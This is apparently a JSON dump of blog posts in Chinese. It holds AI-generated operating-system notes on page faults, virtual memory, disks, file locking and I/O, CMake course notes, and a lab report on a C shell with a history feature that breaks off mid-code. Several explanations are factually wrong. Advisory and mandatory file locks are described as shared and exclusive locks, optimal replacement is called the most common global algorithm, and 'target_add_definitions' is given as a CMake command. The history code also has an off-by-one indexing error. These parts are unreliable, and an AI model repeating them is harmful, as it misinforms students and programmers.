缺页中断是指当CPU访问一个虚拟地址时，发现相应的页表项不在物理内存中时产生的中断。当缺页中断发生时，操作系统需要将相应的页从磁盘中读入到物理内存中，从而满足CPU对该虚拟地址的访问请求。缺页中断的处理过程如下：\n操作系统首先检查虚拟地址对应的页表项是否有效。如果页表项无效，则表示该虚拟地址没有分配物理内存，操作系统将向用户程序发出错误消息。\n如果页表项有效但不在物理内存中，操作系统会将相应的页从磁盘中读取到物理内存中。这个过程称为页面调度或页面置换。\n当页面调度完成后，操作系统会更新页表项中的物理地址，并重新执行CPU的访问请求。\n缺页中断的处理过程涉及到磁盘的读写、页表的更新等多个操作，因此其开销比较大。主要的开销包括：\n磁盘I/O开销：当缺页中断发生时，操作系统需要将相应的页从磁盘中读取到物理内存中。这个过程需要进行磁盘I/O操作，因此会产生较大的开销。\n页面调度开销：当缺页中断发生时，操作系统需要进行页面调度或页面置换，将新的页调入物理内存。这个过程涉及到页表的更新、物理内存的分配等操作，因此会产生较大的开销。\nCPU上下文切换开销：当缺页中断发生时，CPU需要从用户程序的执行状态切换到内核态，执行操作系统的中断处理程序。这个过程涉及到CPU上下文的切换，因此也会产生一定的开销。\n总之，缺页中断是一种重要的内存管理技术，它可以将数据从磁盘中读取到物理内存中，从而满足CPU对该数据的访问请求。缺页中断的处理过程涉及到磁盘I/O、页面调度、CPU上下文切换等多个操作，因此其开销比较大。\n虚拟内存性能 颠簸/抖动 页面置换（全局置换，局部置换） 工作集模型及其原理 虚拟内存是一种计算机内存管理技术，它允许将物理内存和磁盘空间组合使用，从而扩展了内存的容量。虚拟内存的性能受到多个因素的影响，包括颠簸/抖动、页面置换等因素。\n颠簸/抖动：颠簸/抖动是指在虚拟内存中，程序频繁地将页调入和调出物理内存，从而导致内存使用效率的下降。颠簸/抖动的主要原因是物理内存的容量不足，导致操作系统无法同时将所有需要访问的页保留在物理内存中。为了减少颠簸/抖动的影响，可以增加物理内存的容量，或者使用更智能的页面置换算法。\n页面置换：页面置换是指在虚拟内存中，当物理内存中的页数量不足时，操作系统需要将某些页从物理内存中置换到磁盘中，以便为新的页腾出空间。页面置换算法可以分为全局置换和局部置换两种。\n全局置换：全局置换算法是指在所有进程的页中选择最优的一页进行置换。最常用的全局置换算法是最优页面置换算法，它选择要置换的页中，将来最长时间不再使用的页进行置换。\n局部置换：局部置换算法是指在当前进程的页中选择最优的一页进行置换。最常用的局部置换算法是最近最少使用页面置换算法，它选择最近最少使用的页进行置换。\n工作集模型及其原理：工作集模型是一种用于描述进程内存需求的模型。在工作集模型中，每个进程被分为多个工作集，每个工作集包含进程当前正在使用的页。工作集模型的原理是基于程序局部性原则，即程序倾向于访问一些特定的内存区域。操作系统可以利用工作集模型来优化内存管理，例如在进程切换时，只需保留当前工作集中的页，而将其他页置换到磁盘中，从而提高内存的使用效率。 总之，虚拟内存的性能受到多个因素的影响，包括颠簸/抖动、页面置换等因素。为了提高虚拟内存的性能，可以采用增加物理内存、使用更智能的页面置换算法、利用工作集模型等技术。\n大容量存储系统 磁盘组成 磁盘平均接入时间 磁盘平均I/O时间 大容量存储系统通常由多个磁盘组成。每个磁盘是一个独立的物理设备，用于存储数据。这些磁盘可以组合成磁盘阵列或磁盘组，以提供更高的容量和性能。\n磁盘平均接入时间是指从请求一个数据块到能够开始传输该数据块的时间。这个时间包括磁头寻道时间、旋转延迟和数据传输时间等。磁头寻道时间是磁头从当前位置移动到目标数据的时间，旋转延迟是磁盘旋转到目标数据位置的时间，数据传输时间是将数据从磁盘传输到内存或从内存传输到磁盘的时间。磁盘平均接入时间取决于磁盘的性能指标，如转速、磁头移动速度等。\n磁盘平均I/O时间是指完成一个输入/输出操作所需的平均时间。这个时间包括磁盘平均接入时间以及其他可能的延迟，如处理器调度延迟、操作系统调度延迟和数据传输延迟等。磁盘平均I/O时间是一个更全面的性能指标，反映了整个I/O操作的时间开销。\n需要注意的是，磁盘平均接入时间和磁盘平均I/O时间是基于特定的硬件和软件环境进行评估的，不同的系统配置和负载情况下可能会有所差异。\n文件系统接口 文件概念 文件操作 文件锁定 协同锁，强制锁 文件系统接口是操作系统提供给应用程序或用户的一组函数或命令，用于管理文件和目录。它允许应用程序创建、读取、写入、删除和重命名文件，以及在文件系统中进行导航和查询。\n文件是计算机系统中存储数据的基本单位。它是一组有序的字节或字符序列，可以包含文本、图像、音频、视频或其他类型的数据。文件通常由文件名和扩展名（可选）来标识，并存储在文件系统的目录结构中。\n文件操作是指对文件进行的各种操作，包括创建文件、打开文件、读取文件内容、写入文件内容、关闭文件和删除文件等。这些操作可以通过文件系统接口提供的函数或命令来执行。\n文件锁定是一种机制，用于在多个进程或线程同时访问同一个文件时确保数据的一致性和完整性。当一个进程或线程锁定文件时，其他进程或线程无法对该文件进行写入或删除操作，只能进行读取操作。文件锁定可以避免多个进程或线程同时修改同一个文件而引发的数据冲突和竞争条件。\n协同锁是一种文件锁定机制，也称为共享锁或读锁。它允许多个进程或线程同时对同一个文件进行读取操作，但不允许写入操作。当一个进程或线程获得协同锁时，其他进程或线程也可以获得相同的协同锁进行读取操作，但无法获得写入锁。\n强制锁是一种文件锁定机制，也称为排他锁或写锁。它在一个进程或线程对文件进行写入操作时阻止其他进程或线程对该文件进行任何读取或写入操作。只有在强制锁被释放后，其他进程或线程才能获得该文件的读取或写入权限。\n这些文件锁定机制在多进程或多线程的环境中非常重要，可以确保对文件的并发访问的正确性和安全性。不同的操作系统和编程语言提供不同的文件锁定机制和接口来实现这些功能。\n文件访问方法 顺序访问与直接访问 文件访问方法指的是应用程序在读取或写入文件时所采用的方式。主要有两种文件访问方法：顺序访问和直接访问。\n顺序访问（Sequential Access）： 顺序访问是按照文件中数据的顺序进行读取或写入的方式。应用程序必须按照文件中数据的顺序逐个访问数据。当需要读取或写入文件中的某个数据时，必须先读取或写入前面的数据，直到达到目标数据。因此，在顺序访问方法下，无法直接跳到文件中的任意位置进行访问。 顺序访问适用于对文件进行一次性完整处理的情况，比如按行读取文本文件或按帧读取视频文件。顺序访问通常效率较低，因为如果需要访问文件中的某个特定数据，必须遍历前面的数据。\n直接访问（Direct Access）： 直接访问是可以直接跳到文件中任意位置进行读取或写入的方式。每个数据块在文件中都有一个唯一的地址或偏移量，应用程序可以根据需要直接定位到目标数据的位置。这种方式允许随机访问文件中的任何数据块，而不需要按顺序逐个访问。 直接访问适用于需要随机访问文件中的数据的情况，比如数据库系统或索引文件。通过直接访问，应用程序可以快速定位和读取所需的数据，而无需遍历整个文件。\n需要注意的是，文件访问方法取决于文件系统的支持和应用程序的实现。有些文件系统支持直接访问，而有些则只支持顺序访问。此外，某些文件系统可能还提供其他高级的访问方式，如索引访问或哈希访问，以提高对文件的检索效率。\n文件分配方法，连续分配，链接分配，索引分配 文件分配方法是指在文件系统中为文件分配存储空间的方式。主要的文件分配方法包括连续分配、链接分配和索引分配。\n连续分配（Contiguous Allocation）： 连续分配是将文件存储在一片连续的存储空间中。当文件被创建时，操作系统会为该文件分配一块连续的存储空间。文件的大小和存储空间的起始位置都会记录在文件的元数据中。顺序访问文件的性能较好，因为数据在物理上是连续存储的。然而，连续分配的缺点是容易产生外部碎片，当文件删除或大小调整时，可能会导致存储空间被分割成不连续的小块，难以有效利用。\n链接分配（Linked Allocation）： 链接分配是通过链表的方式为文件分配存储空间。每个文件块存储数据以及指向下一个文件块的指针。文件的元数据中记录了第一个块的地址。这种方式可以克服外部碎片问题，因为存储空间可以随意分配，但可能会带来内部碎片，因为每个文件块的大小通常是固定的，如果文件大小不是块大小的倍数，最后一个块可能会浪费部分空间。链表的遍历可能会带来一些额外的开销，因此顺序访问的性能较差。\n索引分配（Indexed Allocation）： 索引分配是通过使用索引表来管理文件的存储空间。索引表包含了指向文件块的索引项，每个索引项存储了对应块的地址或偏移量。文件的元数据中记录了索引表的地址。通过索引表，可以快速定位和访问文件的任意块，无论文件的大小。索引分配克服了链接分配的性能问题，但会占用额外的存储空间来存储索引表，对于小文件可能会浪费空间。\n需要注意的是，不同的文件系统可能采用不同的文件分配方法，或者结合使用多种分配方法。选择适当的文件分配方法取决于文件系统的设计目标、文件大小和访问模式等因素。\nIO指令控制方式（轮询，中断，DMA） IO指令控制方式指的是在计算机系统中，用于控制输入/输出（IO）设备的方式。主要的IO指令控制方式包括轮询（Polling）、中断（Interrupt）和直接内存访问（Direct Memory Access，DMA）。\n轮询（Polling）： 在轮询方式中，CPU通过不断查询IO设备的状态来确定IO操作是否完成。CPU会周期性地发送查询指令，检查IO设备的状态寄存器或标志位，以了解IO操作是否完成或是否需要CPU的进一步处理。如果IO设备完成了请求的操作，CPU将获取IO设备的数据并继续执行后续的指令。轮询方式简单直观，但会占用大量的CPU时间和资源，因为CPU需要不断查询IO设备的状态。\n中断（Interrupt）： 在中断方式中，IO设备通过发送中断请求（Interrupt Request，IRQ）信号来通知CPU需要处理的事件。当IO设备需要CPU的处理时，它会发送中断信号，将CPU从当前执行的任务中打断，转而执行与中断相关的处理程序（中断处理程序）。中断处理程序将处理IO设备的请求并获取IO数据。中断方式可以提高CPU的利用率，因为CPU只在需要处理IO设备时才会被打断。\n直接内存访问（DMA）： DMA是一种特殊的IO指令控制方式，用于在IO设备和主存之间直接进行数据传输，而不需要CPU的直接参与。在DMA方式下，IO设备可以直接访问主存，通过DMA控制器将数据直接传输到指定的内存位置，或从内存中直接读取数据并发送到IO设备。这样可以减少CPU的负担，提高数据传输速率。DMA方式适用于大量数据的高速传输，如磁盘IO、网络IO等。\n需要注意的是，不同的IO设备和系统架构可能对IO指令控制方式的支持程度有所差异。有些设备可能只支持特定的控制方式，而其他设备则可以支持多种方式。系统设计人员需要根据具体的需求和硬件条件选择合适的IO指令控制方式。\n应用-IO接口 应用用IO接口\n﻿使IO设备能够以标准，统一的方式进行处理 以文件形式查看设备\n﻿IO系统调用将设备行为封装在通用类中 将设备的行为封装在几个通用类中，这些类隐藏了应用程序的硬件差异。\n﻿内核的IO子系统中的设备驱动层隐藏了设备控制器之间的差异，为上层提供统一的接口。\n同步IO与异步IO 两种常见的IO方法是同步IO（Synchronous IO）和异步IO（Asynchronous IO）。\n同步IO（Synchronous IO）： 同步IO是一种阻塞式的IO方法，它在进行IO操作时会阻塞调用者的进程或线程，直到IO操作完成并返回结果。在同步IO中，应用程序发起一个IO请求后，它会等待IO操作完成，并在收到结果后继续执行后续的代码。同步IO操作是按照顺序进行的，一个IO操作完成后才能开始下一个IO操作。如果IO操作的执行时间较长，它将会阻塞整个进程或线程，导致资源浪费和性能下降。同步IO适用于简单的IO场景，代码编写相对简单，但会导致资源的低效利用。\n异步IO（Asynchronous IO）： 异步IO是一种非阻塞式的IO方法，它允许应用程序在IO操作进行的同时继续执行其他任务，而不必等待IO操作的完成。在异步IO中，应用程序发起一个IO请求后，不会阻塞进程或线程，而是继续执行后续的代码。当IO操作完成时，系统会通知应用程序，并提供相应的结果。异步IO操作可以同时进行多个IO操作，并通过回调函数或轮询方式获取IO操作的结果。异步IO可以提高系统的并发性和响应性能，特别适用于需要处理大量并发IO请求或需要等待时间较长的IO操作。\n需要注意的是，同步IO和异步IO并不是绝对的二选一，它们可以在不同的场景中混合使用。例如，可以使用同步IO进行简单的IO操作，而使用异步IO处理更复杂的IO任务，以提高系统的整体性能。选择适当的IO方法取决于应用程序的需求、系统的性能要求和开发者的偏好。\n","permalink":"http://localhost:1313/gpttallos/","summary":"系统调用消息传递 系统调用是用户程序和操作系统内核之间的接口，用于向内核发出请求，获取系统资源和执行特权操作。系统调用通常需要传递一些参数，以","title":"GPT讲操作系统概念"},{"content":"课程作者：@彭于斌 课程网站：高性能并行编程与优化\nCMake的命令行调用 读取当前目录的 CMakeLists.txt，并在 build 文件夹下生成 build/Makefile：\ncmake -B build 让 make 读取 build/Makefile，并开始构建 a.out： make -C build 以下命令和上一个等价，但更跨平台： cmake \u0026ndash;build build 执行生成的 a.out： build/a.out\nCMake中的静态库与动态库 CMake 除了 add_executable 可以生成可执行文件外，还可以通过 add_library 生成库文件。 add_library 的语法与 add_executable 大致相同，除了他需要指定是动态库还是静态库： add_library(test STATIC source1.cpp source2.cpp) # 生成静态库 libtest.a add_library(test SHARED source1.cpp source2.cpp) # 生成动态库 libtest.so 动态库有很多坑，特别是 Windows 环境下，初学者自己创建库时，建议使用静态库。 创建库以后，要在某个可执行文件中使用该库，只需要： target_link_libraries(myexec PUBLIC test) # 为 myexec 链接刚刚制作的库 libtest.a\n为什么C++需要声明？ C++ 是一种强烈依赖上下文信息的编程语言。\nvector \u0026lt; MyClass \u0026gt; a; // 声明一个由 MyClass 组成的数组\n如果编译器不知道 vector 是个模板类，那他完全可以把 vector 看做一个变量名，把 \u0026lt; 解释为小于号，从而理解成判断‘vector’这个变量的值是否小于‘MyClass’这个变量的值。\n正因如此，我们常常可以在 C++ 代码中看见这样的写法：typename decay::type\n因为 T 是不确定的，导致编译器无法确定 decay 的 type 是一个类型，还是一个值。因此用 typename 修饰来让编译器确信这是一个类型名……\n为什么需要头文件？ 便于声明与实现分开，不用在每个文件里都声明一遍，只需include相应头文件就好了。\nCMake中的子模块 复杂的工程中，我们需要划分子模块，通常一个库一个目录，比如： 这里我们把 hellolib 库的东西移到 hellolib 文件夹下了，里面的 CMakeLists.txt 定义了 hellolib 的生成规则。 要在根目录使用他，可以用 CMake 的 add_subdirectory 添加子目录，子目录也包含一个 CMakeLists.txt，其中定义的库在 add_subdirectory 之后就可以在外面使用。 子目录的 CMakeLists.txt 里路径名（比如 hello.cpp）都是相对路径，这也是很方便的一点。\n1 2 3 4 5 6 7 - - hellolib - CMakeLists.txt - hello.cpp - hello.h - CMakeLists.txt - main.cpp hellolib/CMakeLists.txt\n1 add_library(hellolib STATIC hello.cpp) CMakeLists.txt\n1 2 3 4 5 6 7 cmake_minimum_required(VERSION 3.12) project(hellocmake LANGUAGES CXX) add_subdirectory(hellolib) add_executable(a.out main.cpp) target_link_libraries(a.out PUBLIC hellolib) 子模块的头文件如何处理 因为 hello.h 被移到了 hellolib 子文件夹里，因此 main.cpp 里也要改成：\n1 #include \u0026#34;hellolib/hello.h\u0026#34; 如果要避免修改代码，我们可以通过 target_include_directories 指定 a.out 的头文件搜索目录（第一个是库名，第二个是目录）。\n1 2 3 4 5 6 7 cmake_minimum_required(VERSION 3.12) project(hellocmake LANGUAGES CXX) add_subdirectory(hellolib) add_executable(a.out main.cpp) target_link_libraries(a.out PUBLIC hellolib) 这样甚至可以用 \u0026lt;hello.h\u0026gt; 来引用这个头文件了，因为通过 target_include_directories 指定的路径会被视为与系统路径等价。\n但是这样如果另一个 b.out 也需要用 hellolib 这个库，难道也得再指定一遍搜索路径吗？\n不需要，其实我们只需要定义 hellolib 的头文件搜索路径，引用他的可执行文件 CMake 会自动添加这个路径：\n1 2 add_library(hellolib STATIC hello.cpp) target_include_directories(hellolib PUBLIC .) 这里用了 . 表示当前路径，因为子目录里的路径是相对路径，类似还有 .. 表示上一层目录。\n此外，如果不希望让引用 hellolib 的可执行文件自动添加这个路径，把 PUBLIC 改成PRIVATE 即可。这就是他们的用途：决定一个属性要不要在被 link 的时候传播。\nCMake的一些其他选项 1 2 3 4 5 6 7 8 9 10 11 12 除了头文件搜索目录以外，还有这些选项，PUBLIC 和 PRIVATE 对他们同理： target_include_directories(myapp PUBLIC /usr/include/eigen3) # 添加头文件搜索目录 target_link_libraries(myapp PUBLIC hellolib) # 添加要链接的库 target_add_definitions(myapp PUBLIC MY_MACRO=1) # 添加一个宏定义 target_add_definitions(myapp PUBLIC -DMY_MACRO=1) # 与 MY_MACRO=1 等价 target_compile_options(myapp PUBLIC -fopenmp) # 添加编译器命令行选项 target_sources(myapp PUBLIC hello.cpp other.cpp) # 添加要编译的源文件 以及可以通过下列指令（不推荐使用），把选项加到所有接下来的目标去： include_directories(/opt/cuda/include) # 添加头文件搜索目录 link_directories(/opt/cuda) # 添加库文件的搜索路径 add_definitions(MY_MACRO=1) # 添加一个宏定义 add_compile_options(-fopenmp) # 添加编译器命令行选项 第三方库 - 作为纯头文件引入 nothings/stb - 大名鼎鼎的 stb_image 系列，涵盖图像，声音，字体等，只需单头文件！\nNeargye/magic_enum - 枚举类型的反射，如枚举转字符串等（实现方式很巧妙）\ng-truc/glm - 模仿 GLSL 语法的数学矢量/矩阵库（附带一些常用函数，随机数生成等）\nTencent/rapidjson - 单纯的 JSON 库，甚至没依赖 STL（可定制性高，工程美学经典）\nericniebler/range-v3 - C++20 ranges 库就是受到他启发（完全是头文件组成）\nfmtlib/fmt - 格式化库，提供 std::format 的替代品（需要 -DFMT_HEADER_ONLY）\ngabime/spdlog - 能适配控制台，安卓等多后端的日志库（和 fmt 冲突！）\n只需要把他们的 include 目录或头文件下载下来，然后 include_directories(spdlog/include) 即可。\n缺点：函数直接实现在头文件里，没有提前编译，从而需要重复编译同样内容，编译时间长。\n第三方库 - 作为子模块引入 第二友好的方式则是作为 CMake 子模块引入，也就是通过 add_subdirectory。\n方法就是把那个项目（以fmt为例）的源码放到你工程的根目录：\n这些库能够很好地支持作为子模块引入：\nfmtlib/fmt - 格式化库，提供 std::format 的替代品\ngabime/spdlog - 能适配控制台，安卓等多后端的日志库\nericniebler/range-v3 - C++20 ranges 库就是受到他启发\ng-truc/glm - 模仿 GLSL 语法的数学矢量/矩阵库\nabseil/abseil-cpp - 旨在补充标准库没有的常用功能\nbombela/backward-cpp - 实现了 C++ 的堆栈回溯便于调试\ngoogle/googletest - 谷歌单元测试框架\ngoogle/benchmark - 谷歌性能评估框架\nglfw/glfw - OpenGL 窗口和上下文管理\nlibigl/libigl - 各种图形学算法大合集\n引用系统中预安装的第三方库 可以通过 find_package 命令寻找系统中的包/库：\n1 2 find_package(fmt REQUIRED) target_link_libraries(myexec PUBLIC fmt::fmt) 为什么是 fmt::fmt 而不是简单的 fmt？\n现代 CMake 认为一个包 (package) 可以提供多个库，又称组件 (components)，比如 TBB 这个包，就包含了 tbb, tbbmalloc, tbbmalloc_proxy 这三个组件。\n因此为避免冲突，每个包都享有一个独立的名字空间，以 :: 的分割（和 C++ 还挺像的）。\n你可以指定要用哪几个组件：\n1 2 find_package(TBB REQUIRED COMPONENTS tbb tbbmalloc REQUIRED) target_link_libraries(myexec PUBLIC TBB::tbb TBB::tbbmalloc) 还可以使用包管理器安装第三方库 实战 安装并使用RapidJSON库 将RapidJSON库放在include目录下，主文件夹CMakeLists.txt如下图所示：\n1 2 3 4 5 cmake_minimum_required(VERSION 3.12) project(main) add_executable(main main.cpp) target_compile_features(main PUBLIC cxx_std_11) target_include_directories(main PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/include) 实战 引入fmtlib/fmt库 使用子模块的方法导入即可。\n1 2 add_subdirectory(fmt) target_link_libraries(main PUBLIC fmt) 扩展 使用现代工具XMake xmake\n","permalink":"http://localhost:1313/posts/parallels101_1/","summary":"课程作者：@彭于斌 课程网站：高性能并行编程与优化 CMake的命令行调用 读取当前目录的 CMakeLists.txt，并在 build 文件夹下生成 buil","title":"《高性能并行编程与优化1 学C++从CMake学起》笔记"},{"content":"实验题目 Project 1—UNIX Shell and History Feature\nThis project consists of designing a C program to serve as a shell interface\nthat accepts user commands and then executes each command in a separate\nprocess. This project can be completed on any Linux, UNIX, or Mac OS X system.\nA shell interface gives the user a prompt, after which the next command\nis entered. The example below illustrates the prompt osh\u0026gt; and the user’s\nnext command: cat prog.c. (This command displays the file prog.c on the\nterminal using the UNIX cat command.)\nosh\u0026gt; cat prog.c\nOne technique for implementing a shell interface is to have the parent process\nfirst read what the user enters on the command line (in this case, cat\nprog.c), and then create a separate child process that performs the command.\nUnless otherwise specified, the parent process waits for the child to exit\nbefore continuing. This is similar in functionality to the new process creation\nillustrated in Figure 3.10. However, UNIX shells typically also allow the child\nprocess to run in the background, or concurrently. To accomplish this, we add\nan ampersand (\u0026amp;) at the end of the command. Thus, if we rewrite the above\ncommand as\nosh\u0026gt; cat prog.c \u0026amp;\nthe parent and child processes will run concurrently.\nThe separate child process is created using the fork() system call, and the\nuser’s command is executed using one of the system calls in the exec() family\n(as described in Section 3.3.1).\nA C program that provides the general operations of a command-line shell\nis supplied in Figure 3.36. The main() function presents the prompt osh-\u0026gt;\nand outlines the steps to be taken after input from the user has been read. The\nmain() function continually loops as long as should run equals 1; when the\nuser enters exit at the prompt, your program will set should run to 0 and\nterminate.\nThis project is organized into two parts: (1) creating the child process and\nexecuting the command in the child, and (2) modifying the shell to allow a\nhistory feature.\n相关原理与知识（完成实验所用到的相关原理与知识） Linux 进程相关基础知识。\nLinux下C语言编程。\n如何使用终端颜色控制字符调整终端输出字符的颜色。\n命令行解析。\n实验过程（清晰展示实际操作过程，相关截图及解释） 模型归纳 一个典型的shell可以简化为以下形式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 while(1) { init(); read_command(); int pid = fork(); if(pid \u0026lt; 0) { puts(\u0026#34;Unable to fork the child, inner error.\u0026#34;); } else if(pid == 0) // the child thread { execve(command); //execve the command } else // the parent thread { wait(NULL); //waiting for the child to exit } } 当在shell中进行输入时，fork()出子进程来执行我们的输入，父进程则等待我们的子进程执行完成。\n美化实现 通过查阅终端颜色控制符实现几个函数，用于打印彩色字符。\n1 2 3 4 5 void PrintBlue(char *ch) { printf(\u0026#34;\\033[1;34m%s\\033[0m\u0026#34;, ch); } void PrintRed(char *ch) { printf(\u0026#34;\\033[1;31m%s\\033[0m\u0026#34;, ch); } void PrintPink(char *ch) { printf(\u0026#34;\\033[1;35m%s\\033[0m\u0026#34;, ch); } 通过getcwd函数，加上一个小的parser实现获取当前文件夹名称。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void PrintCurrentDir() { char tmp[114]; int tcnt = 0; char *cwd = getcwd(NULL, 0); int cur = strlen(cwd) - 1; while (cwd[cur] != \u0026#39;/\u0026#39;) { tmp[tcnt++] = cwd[cur]; cur--; } for (int i = 0; i \u0026lt; tcnt/2;i++) { char c = tmp[i]; tmp[i] = tmp[tcnt - i - 1]; tmp[tcnt - i - 1] = c; } tmp[tcnt] = 0; PrintPink(tmp); } 最终效果如下：\n核心功能实现 解析输入命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); FILE *fp = fmemopen(buffer, strlen(buffer), \u0026#34;r\u0026#34;); for (int i = 0; i \u0026lt; args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \u0026#34;%s\u0026#34;, args[args_count]); if (fl \u0026lt; 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; 这段代码实现了：安全地读取一行的内容，并将这一行的内容映射成文件，通过fscanf实现模式匹配地读入命令，并将读取的字符串存储在args这个字符串数组中。\n实现cd命令与exit命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if (strcmp(args[0], \u0026#34;cd\u0026#34;) == 0) { if (chdir(args[1]) == -1) { PrintRed(\u0026#34;z-shell: error!\\n\u0026#34;); fflush(stdout); continue; } else { PrintBlue(\u0026#34;z-shell: you are now in \u0026#34;); printf(\u0026#34;%s\\n\u0026#34;, args[1]); fflush(stdout); } continue; } if (strcmp(args[0], \u0026#34;exit\u0026#34;) == 0) { printf(\u0026#34;Bye bye! Thanks to use z-shell!\\n\u0026#34;); fflush(stdout); break; } chdir函数能够实现切换工作目录的功能，若出现错误，则返回-1。exit较简单，不再赘述。\n实现命令执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 if (strcmp(args[args_count - 1], \u0026#34;\u0026amp;\u0026#34;) == 0) { flag = FLAG_EXECVE_NOTWAIT; } pid_t pid = fork(); if (pid == -1) { PrintRed(\u0026#34;z-shell: an error occurred while forking\\n\u0026#34;); fflush(stdout); } else if (pid == 0) { int fl = execvp(args[0], args); if (fl == -1) { PrintRed(\u0026#34;z-shell: unable to execute the programme \u0026#34;); printf(\u0026#34;%s.\\n\u0026#34;, args[0]); fflush(stdout); } exit(0); } else if (flag == FLAG_EXECVE_WAIT) wait(NULL); fork()函数相当于复制当前状态机，子进程的pid=0用于命令执行，父进程则等待子进程执行完毕。若添加了\u0026amp;参数，则父进程无需等待子进程结束。\n实现历史记录功能 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; if (strcmp(args[0], \u0026#34;!!\u0026#34;) == 0) { if (his.his_count == 0) { PrintRed(\u0026#34;z-shell: no commands in history!\\n\u0026#34;); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \u0026#34;!\u0026#34;) == 0) { if (args_count == 1) { PrintRed(\u0026#34;z-shell: please input number!\\n\u0026#34;); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\u0026#34;z-shell: number illegal!\\n\u0026#34;); continue; } int cur = his.his_count - num + 1; if (cur \u0026lt;= 0) { PrintRed(\u0026#34;z-shell: no commands in history!\\n\u0026#34;); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } 使用history这一数据结构存储历史记录，解析!和!!命令访问历史记录，从容器中取出匹配的命令赋值给buffer，当正常的命令结束后，将buffer存储到history。\n测试程序 测试截图如下：\n问题分析与总结 实验中遇到的问题较少，学到了如何控制终端输出彩色字符。\n要注意使用前先malloc分配内存，在不用时及时free，避免段错误或内存泄露。\n完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define MAX_ARGS 114 // 支持的输入变量个数 #define MAX_ARGS_LEN 114 // 单个变量的长度 #define FLAG_EXECVE_WAIT 0 #define FLAG_EXECVE_NOTWAIT 1 #define MAX_HISTORY 114 typedef struct history { char *buf[MAX_HISTORY]; int his_count; } history; void PrintBlue(char *ch) { printf(\u0026#34;\\033[1;34m%s\\033[0m\u0026#34;, ch); } void PrintRed(char *ch) { printf(\u0026#34;\\033[1;31m%s\\033[0m\u0026#34;, ch); } void PrintPink(char *ch) { printf(\u0026#34;\\033[1;35m%s\\033[0m\u0026#34;, ch); } void PrintCurrentDir() { char tmp[114]; int tcnt = 0; char *cwd = getcwd(NULL, 0); int cur = strlen(cwd) - 1; while (cwd[cur] != \u0026#39;/\u0026#39;) { tmp[tcnt++] = cwd[cur]; cur--; } for (int i = 0; i \u0026lt; tcnt/2;i++) { char c = tmp[i]; tmp[i] = tmp[tcnt - i - 1]; tmp[tcnt - i - 1] = c; } tmp[tcnt] = 0; PrintPink(tmp); } int main() { char *args[MAX_ARGS]; char *buffer = (char *)malloc(MAX_ARGS_LEN * MAX_ARGS); int args_count = 0; int flag = 0; history his; his.his_count = 0; printf(\u0026#34;\\033[1;33mWelcome to z-shell!\\033[0m\\n\u0026#34;); PrintPink(\u0026#34; _ _ _ \\n\u0026#34;); PrintPink(\u0026#34; ____ ___| |__ ___| | |\\n\u0026#34;); PrintPink(\u0026#34;|_ /____/ __| \u0026#39;_ \\\\ / _ \\\\ | |\\n\u0026#34;); PrintPink(\u0026#34; / /_____\\\\__ \\\\ | | | __/ | |\\n\u0026#34;); PrintPink(\u0026#34;/___| |___/_| |_|\\\\___|_|_|\\n\u0026#34;); printf(\u0026#34;\\n\\n\u0026#34;); while (1) { PrintBlue(\u0026#34;[z-shell]$ -\u0026gt; \u0026#34;); PrintCurrentDir(); putchar(\u0026#39; \u0026#39;); fflush(stdout); fgets(buffer, MAX_ARGS_LEN * MAX_ARGS, stdin); PARSER:; FILE *fp = fmemopen(buffer, strlen(buffer), \u0026#34;r\u0026#34;); for (int i = 0; i \u0026lt; args_count; i++) free(args[i]); args_count = 0; while (1) { args[args_count] = (char *)malloc(MAX_ARGS_LEN); int fl = fscanf(fp, \u0026#34;%s\u0026#34;, args[args_count]); if (fl \u0026lt; 0) break; args_count++; } if (args_count == 0) continue; free(args[args_count]); args[args_count] = NULL; if (strcmp(args[0], \u0026#34;!!\u0026#34;) == 0) { if (his.his_count == 0) { PrintRed(\u0026#34;z-shell: no commands in history!\\n\u0026#34;); continue; } strcpy(buffer, his.buf[his.his_count]); goto PARSER; } if (strcmp(args[0], \u0026#34;!\u0026#34;) == 0) { if (args_count == 1) { PrintRed(\u0026#34;z-shell: please input number!\\n\u0026#34;); continue; } int num = atoi(args[1]); if (num == -1) { PrintRed(\u0026#34;z-shell: number illegal!\\n\u0026#34;); continue; } int cur = his.his_count - num + 1; if (cur \u0026lt;= 0) { PrintRed(\u0026#34;z-shell: no commands in history!\\n\u0026#34;); continue; } strcpy(buffer, his.buf[cur]); goto PARSER; } if (strcmp(args[0], \u0026#34;exit\u0026#34;) == 0) { // 退出 printf(\u0026#34;Bye bye! Thanks to use z-shell!\\n\u0026#34;); fflush(stdout); break; } if (strcmp(args[0], \u0026#34;cd\u0026#34;) == 0) { if (chdir(args[1]) == -1) { PrintRed(\u0026#34;z-shell: error!\\n\u0026#34;); fflush(stdout); continue; } else { 